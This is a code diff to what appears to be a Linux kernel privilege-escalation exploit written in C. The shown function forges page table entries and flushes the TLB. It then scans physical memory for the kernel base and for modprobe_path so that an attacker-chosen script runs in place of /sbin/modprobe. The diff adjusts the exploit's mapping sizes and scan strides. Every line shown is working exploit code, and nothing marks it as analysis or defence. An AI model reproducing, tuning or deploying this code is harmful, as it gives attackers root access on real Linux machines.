@@ -285,9 +285,9 @@ static void privesc_flh_bypass_no_time(int shell_stdin_fd, int shell_stdout_fd)
 		*(char*)PTI_TO_VIRT(2, i, 0, 0, 0) = 0x41;
 	
 	// these use different PTEs but the same PMD
-	_pmd_area = mmap((void*)PTI_TO_VIRT(1, 1, 0, 0, 0), 0x600000, PROT_READ | PROT_WRITE, MAP_FIXED | MAP_SHARED | MAP_ANONYMOUS, -1, 0);
+	_pmd_area = mmap((void*)PTI_TO_VIRT(1, 1, 0, 0, 0), 0x400000, PROT_READ | PROT_WRITE, MAP_FIXED | MAP_SHARED | MAP_ANONYMOUS, -1, 0);
 	pmd_kernel_area = _pmd_area;
-	pmd_data_area = _pmd_area + 0x300000;
+	pmd_data_area = _pmd_area + 0x200000;
 
 	PRINTF_VERBOSE("[*] allocated VMAs for process:\n  - pte_area: ?\n  - _pmd_area: %p\n  - modprobe_path: '%s' @ %p\n", _pmd_area, modprobe_path, modprobe_path);
 
@@ -375,7 +375,7 @@ static void privesc_flh_bypass_no_time(int shell_stdin_fd, int shell_stdout_fd)
 	// set new pte value for sanity check
 	*pte_area = 0x0 | 0x8000000000000867;
 
-	flush_tlb(_pmd_area, 0x600000);
+	flush_tlb(_pmd_area, 0x400000);
 	PRINTF_VERBOSE("    - PMD area (read target value/page): %016llx (new)\n", *(unsigned long long*)_pmd_area);
 
 	// run this script instead of /sbin/modprobe
@@ -394,7 +394,7 @@ static void privesc_flh_bypass_no_time(int shell_stdin_fd, int shell_stdout_fd)
 		for (unsigned short j=0; j < 512; j++)
 			pte_area[j] = (kernel_iteration_base + CONFIG_PHYSICAL_ALIGN * j) | 0x8000000000000867;
 
-		flush_tlb(_pmd_area, 0x600000);
+		flush_tlb(_pmd_area, 0x400000);
 
 		// scan 1 page (instead of CONFIG_PHYSICAL_ALIGN) for kernel base each iteration
 		for (unsigned long long j=0; j < 512; j++) 
@@ -423,20 +423,20 @@ static void privesc_flh_bypass_no_time(int shell_stdin_fd, int shell_stdout_fd)
 				unsigned long long phys_modprobe_addr;
 				unsigned long long modprobe_iteration_base;
 
-				modprobe_iteration_base = phys_kernel_base + i * 0x300000;
+				modprobe_iteration_base = phys_kernel_base + i * 0x200000;
 
-				PRINTF_VERBOSE("[*] setting physical address range to 0x%016llx - 0x%016llx\n", modprobe_iteration_base, modprobe_iteration_base + 0x300000);
+				PRINTF_VERBOSE("[*] setting physical address range to 0x%016llx - 0x%016llx\n", modprobe_iteration_base, modprobe_iteration_base + 0x200000);
 
 				// set the pages for the other threads PUD data range to kernel memory
 				for (unsigned short j=0; j < 512; j++)
 					pte_area[512 + j] = (modprobe_iteration_base + 0x1000 * j) | 0x8000000000000867;
 
-				flush_tlb(_pmd_area, 0x600000);
+				flush_tlb(_pmd_area, 0x400000);
 				
 #if CONFIG_STATIC_USERMODEHELPER
 				pmd_modprobe_addr = memmem(pmd_data_area, 0x200000, CONFIG_STATIC_USERMODEHELPER_PATH, strlen(CONFIG_STATIC_USERMODEHELPER_PATH));
 #else
-				pmd_modprobe_addr = memmem_modprobe_path(pmd_data_area, 0x300000, modprobe_path, KMOD_PATH_LEN);
+				pmd_modprobe_addr = memmem_modprobe_path(pmd_data_area, 0x200000, modprobe_path, KMOD_PATH_LEN);
 #endif
 				if (pmd_modprobe_addr == NULL)
 					continue;
